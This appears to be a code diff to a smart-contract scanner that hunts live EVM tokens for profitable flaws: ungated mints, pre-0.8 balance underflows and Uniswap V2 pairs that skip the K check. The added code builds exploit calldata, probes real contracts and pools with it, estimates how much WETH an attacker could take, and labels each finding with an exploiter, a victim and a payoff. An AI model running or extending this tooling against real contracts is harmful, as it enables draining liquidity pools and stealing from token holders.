@@ -38,7 +38,12 @@ from evm_extractor import EVMExtractor
 from solana_extractor import SolanaExtractor
 from analyzer import ContractAnalyzer
 from profit_estimator import apply_profit_gate, profit_gate_enabled, profit_to_dict
-from fork_profit_gate import run_fork_profit_test, should_emit_triage
+from fork_profit_gate import (
+    ForkGateResult,
+    run_fork_overflow_test,
+    run_fork_profit_test,
+    split_fork_gated,
+)
 
 console = Console()
 
@@ -150,7 +155,7 @@ AUTOLIQ_FN_RE = re.compile(
     r"function\s+(_swapBack|swapAndLiquify|_swapTokensForETH|_swapTokensForEth)\s*\("
 )
 AUTH_HINT = re.compile(
-    r"onlyOwner|onlyRole|onlyAdmin|onlyGovernance|onlyKeeper|onlyOperator|"
+    r"onlyOwner|onlyMinter|onlyRole|onlyAdmin|onlyGovernance|onlyKeeper|onlyOperator|"
     r"onlyAuth|requiresAuth|canCall|ensure_owner|onlyPatron|onlyManager|"
     r"onlyPlatform|onlyFactory|onlyPoolManager|isOwner|governance\(\)|"
     r"msg\.sender\s*==\s*(?:owner|_owner|platform|governance|manager|poolManager)",
@@ -170,6 +175,16 @@ SIG_REPLAY_MITIGATED = (
     "enum RecoverError",
 )
 LENDING_HINTS = ("borrow", "collateral", "liquida", "healthFactor", "ltv", "debtShares")
+
+
+def _pragma_is_pre_08(spec: str) -> bool:
+    """True when a pragma cannot select Solidity 0.8 checked arithmetic."""
+    text = spec or ""
+    if re.search(r"<\s*0\.8\b", text):
+        return True
+    if re.search(r"0\.8\b|\^0\.8|0\.9\b", text):
+        return False
+    return re.search(r"0\.[4-7]\b", text) is not None
 
 # Reliable Public RPC Fallbacks per Chain
 RPC_ENDPOINTS = {
@@ -192,7 +207,8 @@ _TOKEN_UPDATE_COLUMNS = frozenset({
     "has_reflection_ratio_flaw", "has_reentrancy_flaw", "has_unprotected_initializer",
     "has_spot_oracle_flaw", "has_signature_replay_flaw", "has_tx_origin_auth",
     "has_unprotected_router_setter", "has_permit_no_nonce", "has_multicall_msgvalue",
-    "has_public_swapback", "triage_file_path",
+    "has_public_swapback", "has_public_mint", "has_balance_overflow",
+    "triage_file_path",
     "slither_high", "slither_medium", "slither_low",
     "expected_profit_eth", "last_checked_at", "next_check_at", "watch_bucket",
     "state_snapshot", "verified",
@@ -288,6 +304,8 @@ class TokenScannerDB:
                         has_permit_no_nonce BOOLEAN DEFAULT 0,
                         has_multicall_msgvalue BOOLEAN DEFAULT 0,
                         has_public_swapback BOOLEAN DEFAULT 0,
+                        has_public_mint BOOLEAN DEFAULT 0,
+                        has_balance_overflow BOOLEAN DEFAULT 0,
                         slither_high INTEGER,
                         slither_medium INTEGER,
                         slither_low INTEGER,
@@ -317,6 +335,8 @@ class TokenScannerDB:
                         ("has_permit_no_nonce", "BOOLEAN DEFAULT 0"),
                         ("has_multicall_msgvalue", "BOOLEAN DEFAULT 0"),
                         ("has_public_swapback", "BOOLEAN DEFAULT 0"),
+                        ("has_public_mint", "BOOLEAN DEFAULT 0"),
+                        ("has_balance_overflow", "BOOLEAN DEFAULT 0"),
                         ("triage_file_path", "TEXT"),
                         ("expected_profit_eth", "REAL"),
                         ("last_checked_at", "TEXT"),
@@ -390,6 +410,8 @@ class TokenScannerDB:
             data.get("has_permit_no_nonce", False),
             data.get("has_multicall_msgvalue", False),
             data.get("has_public_swapback", False),
+            data.get("has_public_mint", False),
+            data.get("has_balance_overflow", False),
             data.get("slither_high", 0),
             data.get("slither_medium", 0),
             data.get("slither_low", 0),
@@ -415,9 +437,10 @@ class TokenScannerDB:
                         has_signature_replay_flaw, has_tx_origin_auth,
                         has_unprotected_router_setter, has_permit_no_nonce,
                         has_multicall_msgvalue, has_public_swapback,
+                        has_public_mint, has_balance_overflow,
                         slither_high, slither_medium, slither_low,
                         triage_file_path, raw_metadata, expected_profit_eth
-                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                     """,
                     params,
                 )
@@ -852,6 +875,154 @@ class OnChainStateVerifier:
         except Exception as e:
             return OnChainStateVerifier._classify_probe_error(e)
 
+    _MINT_FN_RE = re.compile(
+        r"function\s+mint\s*\(([^)]*)\)\s*(?:public|external)",
+        re.IGNORECASE,
+    )
+
+    @staticmethod
+    def encode_univ2_swap_args(amount0: int, amount1: int, recipient: str) -> bytes:
+        """ABI-encode ``swap(uint256,uint256,address,bytes)`` arguments (empty bytes)."""
+        addr = bytes.fromhex(recipient.lower().replace("0x", "")[-40:].rjust(64, "0"))
+        offset = (32 * 4).to_bytes(32, "big")
+        return (
+            int(amount0).to_bytes(32, "big")
+            + int(amount1).to_bytes(32, "big")
+            + addr
+            + offset
+            + (0).to_bytes(32, "big")
+        )
+
+    @staticmethod
+    def mint_probe_plan(
+        source_text: str,
+        recipient: str = "0x00000000000000000000000000000000000A11cE",
+    ) -> Optional[Tuple[str, bytes]]:
+        """Calldata for an ungated ERC-20 ``mint`` that takes a uint amount.
+
+        Payable mints are buys. ``mint()`` with no amount is an NFT-style
+        fixed mint and is not priced as an unlimited sell.
+        """
+        source = source_text or ""
+        for match in OnChainStateVerifier._MINT_FN_RE.finditer(source):
+            prefix = source[max(0, match.start() - 80): match.start()]
+            if "interface " in prefix:
+                continue
+            header = source[match.start(): match.start() + 450].split("{", 1)[0]
+            if "{" not in source[match.start(): match.start() + 250]:
+                continue
+            if "payable" in header.lower():
+                continue
+            if AUTH_HINT.search(header):
+                continue
+            raw_params = match.group(1).strip()
+            if not raw_params or not re.search(r"\buint\d*\b", raw_params, re.I):
+                continue
+            body = source[match.start(): match.start() + 1200]
+            if not re.search(
+                r"_mint\s*\(|balances?\s*\[|_balances\s*\[|totalSupply\s*\+",
+                body,
+            ):
+                continue
+            types: List[str] = []
+            chunks: List[bytes] = []
+            ok = True
+            for part in raw_params.split(","):
+                cleaned = re.sub(
+                    r"\b(memory|calldata|storage|indexed)\b", "", part
+                ).strip()
+                if not cleaned:
+                    continue
+                typ = cleaned.split()[0]
+                tl = typ.lower()
+                if tl == "address":
+                    types.append("address")
+                    chunks.append(OnChainStateVerifier._abi_word_addr(recipient))
+                elif tl.startswith("uint"):
+                    types.append(typ)
+                    chunks.append(OnChainStateVerifier._abi_word_uint(10 ** 24))
+                else:
+                    ok = False
+                    break
+            if not ok or not chunks or not any(t.startswith("uint") for t in types):
+                continue
+            return f"mint({','.join(types)})", b"".join(chunks)
+        return None
+
+    @staticmethod
+    def balance_overflow_hit(source_text: str) -> Optional[re.Match]:
+        """Public ``transfer`` that updates balances with raw ``+``/``-`` before 0.8.
+
+        OpenZeppelin ``.add`` / ``.sub`` and Solidity 0.8 checked math are skipped.
+        The nearest preceding ``pragma solidity`` must be a pre-0.8 spec.
+        """
+        source = source_text or ""
+        for match in re.finditer(
+            r"function\s+transfer\s*\(\s*address\s+\w+\s*,\s*uint(?:256)?\s+\w+\s*\)"
+            r"\s*(?:public|external)",
+            source,
+        ):
+            prefix = source[max(0, match.start() - 80): match.start()]
+            if "interface " in prefix:
+                continue
+            if "{" not in source[match.start(): match.start() + 250]:
+                continue
+            if not StaticVulnerabilityAuditor._header_lacks_auth(source, match):
+                continue
+            pragmas = list(
+                re.finditer(r"pragma\s+solidity\s+([^;]+);", source[: match.start()])
+            )
+            if not pragmas or not _pragma_is_pre_08(pragmas[-1].group(1)):
+                continue
+            next_fn = re.search(
+                r"\n\s*function\s+", source[match.end():]
+            )
+            end = match.end() + next_fn.start() if next_fn else match.end() + 1500
+            body = source[match.start(): end]
+            if re.search(r"\.(?:add|sub)\s*\(", body):
+                continue
+            if re.search(
+                r"(?:balances|_balances)\s*\[[^\]]+\]\s*(?:\+=|-=|=(?!=))",
+                body,
+            ):
+                return match
+        return None
+
+    @staticmethod
+    def probe_pair_swap_k(w3, pair: str, weth: str) -> str:
+        """Ask a V2 pair for ``reserveWETH - 1`` with no input. Success breaks K.
+
+        ``no_selector`` means the runtime code has no ``swap`` dispatcher, so a
+        successful call would be a payable fallback rather than a broken pair.
+        """
+        if not w3 or not pair or not weth:
+            return "revert"
+        try:
+            pair_cs = w3.to_checksum_address(pair)
+            signature = "swap(uint256,uint256,address,bytes)"
+            selector = w3.keccak(text=signature)[:4]
+            code = bytes(w3.eth.get_code(pair_cs) or b"")
+            if selector not in code:
+                return "no_selector"
+            pair_c = w3.eth.contract(address=pair_cs, abi=PAIR_ABI)
+            reserve0, reserve1, _ = pair_c.functions.getReserves().call()
+            token0 = pair_c.functions.token0().call()
+            weth_is_token0 = str(token0).lower() == weth.lower()
+            eth_raw = int(reserve0 if weth_is_token0 else reserve1)
+            if eth_raw <= 1:
+                return "dust"
+            amount0, amount1 = (
+                (eth_raw - 1, 0) if weth_is_token0 else (0, eth_raw - 1)
+            )
+            args = OnChainStateVerifier.encode_univ2_swap_args(
+                amount0, amount1, OnChainStateVerifier.PROBE_EOA
+            )
+            return OnChainStateVerifier.probe_unauth_selector(
+                w3, pair_cs, signature, args_data=args
+            )
+        except Exception:
+            return "revert"
+
     @staticmethod
     def evaluate_swapback_liveness(w3, token_address: str, source_text: str) -> Dict:
         """Reachability gates for tax-token auto-liq (`_swapBack`)."""
@@ -1002,6 +1173,39 @@ class OnChainStateVerifier:
                 f"excess_token={pair_tok - res_tok:.4f} profit={est.expected_profit_eth:.4f}"
             ),
             "profit": payload,
+        }
+
+    @staticmethod
+    def pair_broken_k_exploit(w3, chain: str, token: str) -> Optional[Dict]:
+        """If ``swap`` pays out WETH without enforcing K, the reserve is takeable."""
+        from profit_estimator import estimate_broken_k_profit, profit_to_dict
+
+        cfg = DEX_CONFIG.get((chain or "").lower())
+        if not w3 or not cfg:
+            return None
+        amm = OnChainStateVerifier.evaluate_amm_slippage_reserves(w3, chain, token)
+        pair = (amm.get("primary_pool") or {}).get("pair")
+        reserve_eth = float(amm.get("eth_reserve") or 0.0)
+        est = estimate_broken_k_profit(pool_eth=reserve_eth)
+        if not est.actionable or not pair:
+            return None
+        probe = OnChainStateVerifier.probe_pair_swap_k(w3, pair, cfg["weth"])
+        if probe != "success":
+            return None
+        return {
+            "type": "PAIR_K_BROKEN",
+            "user_exploitable": True,
+            "severity": "CRITICAL",
+            "title": "UniV2 swap sin chequeo de K",
+            "exploiter": "Cualquier EOA (pair.swap)",
+            "victim": "Reserva WETH del par",
+            "payoff": "Recibir reserve-1 wei de WETH sin entregar token.",
+            "snippet": "function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;",
+            "onchain_evidence": (
+                f"pair={pair} swap_probe={probe} reserve_eth={reserve_eth:.4f} "
+                f"profit={est.expected_profit_eth:.4f}"
+            ),
+            "profit": profit_to_dict(est),
         }
 
     @staticmethod
@@ -1451,14 +1655,76 @@ class OnChainStateVerifier:
                 else:
                     status_notes.append("FOT_UNFUNDED")
 
+            elif vtype == "PUBLIC_MINT":
+                plan = OnChainStateVerifier.mint_probe_plan(source_text)
+                amm_eval = OnChainStateVerifier.evaluate_amm_slippage_reserves(
+                    w3, chain, address
+                )
+                pool_eth = float(amm_eval.get("eth_reserve") or 0.0)
+                if plan is None:
+                    status_notes.append("PUBLIC_MINT_NO_PROBE")
+                elif pool_eth < 0.05:
+                    status_notes.append(f"PUBLIC_MINT_DUST_POOL_{pool_eth:.4f}ETH")
+                else:
+                    sig, args_data = plan
+                    probe = OnChainStateVerifier.probe_unauth_selector(
+                        w3, address, sig, args_data=args_data
+                    )
+                    if probe == "success":
+                        exp["_pool_eth"] = pool_eth
+                        exp["onchain_evidence"] = (
+                            f"Ungated mint probe={probe} pool_eth={pool_eth:.4f}"
+                        )
+                        confirmed_exploits.append(exp)
+                        status_notes.append("PUBLIC_MINT_CALLABLE")
+                    elif probe == "auth":
+                        status_notes.append("PUBLIC_MINT_AUTH_REVERTED")
+                    else:
+                        status_notes.append("PUBLIC_MINT_REVERT")
+
+            elif vtype == "BALANCE_OVERFLOW":
+                amm_eval = OnChainStateVerifier.evaluate_amm_slippage_reserves(
+                    w3, chain, address
+                )
+                pool_eth = float(amm_eval.get("eth_reserve") or 0.0)
+                if pool_eth < 0.05:
+                    status_notes.append(f"BALANCE_OVERFLOW_DUST_POOL_{pool_eth:.4f}ETH")
+                else:
+                    # transfer(other, 1) from a 0 balance. Checked math reverts.
+                    # Raw subtraction underflows and leaves the caller with ~2^256.
+                    bob = "0x0000000000000000000000000000000000000B0b"
+                    args = (
+                        OnChainStateVerifier._abi_word_addr(bob)
+                        + OnChainStateVerifier._abi_word_uint(1)
+                    )
+                    probe = OnChainStateVerifier.probe_unauth_selector(
+                        w3, address, "transfer(address,uint256)", args_data=args
+                    )
+                    if probe == "success":
+                        exp["_pool_eth"] = pool_eth
+                        exp["requires_live_fork"] = True
+                        exp["onchain_evidence"] = (
+                            f"transfer(other,1) from empty EOA succeeded; "
+                            f"pool_eth={pool_eth:.4f}; fork required"
+                        )
+                        confirmed_exploits.append(exp)
+                        status_notes.append("BALANCE_OVERFLOW_CANDIDATE")
+                    else:
+                        status_notes.append("BALANCE_OVERFLOW_REVERT")
+
             else:
                 status_notes.append(f"{vtype}_NO_DYNAMIC_GATE")
 
         skim_exp = None
+        k_exp = None
         try:
             skim_exp = OnChainStateVerifier.pair_skim_exploit(w3, chain, address)
         except Exception:
             skim_exp = None
+        try:
+            k_exp = OnChainStateVerifier.pair_broken_k_exploit(w3, chain, address)
+        except Exception:
+            k_exp = None
 
         if confirmed_exploits:
             if profit_gate_enabled():
@@ -1496,6 +1762,14 @@ class OnChainStateVerifier:
             cur = float((profit_payload or {}).get("expected_profit_eth") or 0.0)
             if float(sp.get("expected_profit_eth") or 0.0) >= cur:
                 profit_payload = sp
+
+        if k_exp:
+            confirmed_exploits.append(k_exp)
+            status_notes.append("PAIR_K_BROKEN")
+            kp = k_exp.get("profit") or {}
+            cur = float((profit_payload or {}).get("expected_profit_eth") or 0.0)
+            if float(kp.get("expected_profit_eth") or 0.0) >= cur:
+                profit_payload = kp
 
         is_active = len(confirmed_exploits) > 0
         final_status = " | ".join(status_notes) if status_notes else "STATIC_ONLY"
@@ -1592,6 +1866,8 @@ class StaticVulnerabilityAuditor:
             "has_permit_no_nonce": False,
             "has_multicall_msgvalue": False,
             "has_public_swapback": False,
+            "has_public_mint": False,
+            "has_balance_overflow": False,
         }
         evidence_list = []
 
@@ -1659,6 +1935,43 @@ class StaticVulnerabilityAuditor:
                 "victim": "Holders (Dilución del valor)",
                 "payoff": "Creación arbitraria de suministro.",
                 "snippet": snippet
+            })
+
+        # 4b. Ungated mint (the owner-only match above is not user-exploitable).
+        mint_plan = OnChainStateVerifier.mint_probe_plan(source_text)
+        if mint_plan is not None:
+            findings["has_public_mint"] = True
+            mint_at = source_text.find("function mint")
+            snippet = StaticVulnerabilityAuditor._extract_snippet(
+                source_text, max(0, mint_at)
+            )
+            evidence_list.append({
+                "type": "PUBLIC_MINT",
+                "user_exploitable": True,
+                "title": "mint() público sin control de acceso",
+                "severity": "CRITICAL",
+                "exploiter": "Cualquier EOA",
+                "victim": "Par WETH del token",
+                "payoff": "Mintear y vender contra la reserva WETH.",
+                "snippet": snippet,
+            })
+
+        overflow_hit = OnChainStateVerifier.balance_overflow_hit(source_text)
+        if overflow_hit is not None:
+            findings["has_balance_overflow"] = True
+            snippet = StaticVulnerabilityAuditor._extract_snippet(
+                source_text, overflow_hit.start()
+            )
+            evidence_list.append({
+                "type": "BALANCE_OVERFLOW",
+                "user_exploitable": True,
+                "title": "transfer() pre-0.8 con aritmética sin SafeMath",
+                "severity": "CRITICAL",
+                "exploiter": "EOA sin saldo (underflow de balances)",
+                "victim": "Par WETH del token",
+                "payoff": "Acreditarse un balance enorme y venderlo al par.",
+                "snippet": snippet,
+                "requires_live_fork": True,
             })
 
         # 5. Broken Access Control on Critical Financial Functions
@@ -2490,6 +2803,8 @@ class ChainScannerWorker:
             "has_permit_no_nonce": False,
             "has_multicall_msgvalue": False,
             "has_public_swapback": False,
+            "has_public_mint": False,
+            "has_balance_overflow": False,
             "slither_high": 0,
             "slither_medium": 0,
             "slither_low": 0,
@@ -2521,26 +2836,40 @@ class ChainScannerWorker:
                     scan_result["expected_profit_eth"] = profit_payload.get("expected_profit_eth")
 
                 if is_active_onchain and confirmed_exploits:
-                    fork_res = run_fork_profit_test(address, self.chain)
-                    if not should_emit_triage(
-                        is_active=True,
-                        confirmed=confirmed_exploits,
-                        fork_result=fork_res,
-                    ):
+                    plain = [e for e in confirmed_exploits if not e.get("requires_live_fork")]
+                    held = [e for e in confirmed_exploits if e.get("requires_live_fork")]
+                    plain_fr = (
+                        run_fork_profit_test(address, self.chain)
+                        if plain
+                        else ForkGateResult(passed=True, skipped=True, reason="no_plain")
+                    )
+                    overflow_fr = (
+                        run_fork_overflow_test(address, self.chain)
+                        if held
+                        else ForkGateResult(passed=True, skipped=True, reason="no_held")
+                    )
+                    emit_list, fork_notes = split_fork_gated(
+                        confirmed_exploits, plain_fr, overflow_fr
+                    )
+                    if not emit_list:
                         scan_result["dynamic_status"] = (
-                            f"{dynamic_status} | FORK_GATE_{fork_res.reason.upper()}"
+                            f"{dynamic_status} | {' | '.join(fork_notes)}"
                         )
                         console.print(
-                            f"[dim yellow]  ↳ Fork gate blocked triage ({fork_res.reason}).[/]"
+                            f"[dim yellow]  ↳ Fork gate blocked triage ({', '.join(fork_notes)}).[/]"
                         )
                     else:
+                        if fork_notes:
+                            scan_result["dynamic_status"] = (
+                                f"{dynamic_status} | {' | '.join(fork_notes)}"
+                            )
                         scan_result["is_user_exploitable"] = True
                         triage_path = TriageReportGenerator.generate_triage_file(
-                            scan_result, confirmed_exploits
+                            scan_result, emit_list
                         )
                         scan_result["triage_file_path"] = triage_path
                         AlertDispatcher.emit_triage_alert(
-                            scan_result, confirmed_exploits, triage_path
+                            scan_result, emit_list, triage_path
                         )
                 else:
                     console.print(f"[dim yellow]  ↳ On-Chain Status: {dynamic_status} (Balance: {eth_balance:.4f} ETH). Filtered from Triage Queue.[/]")
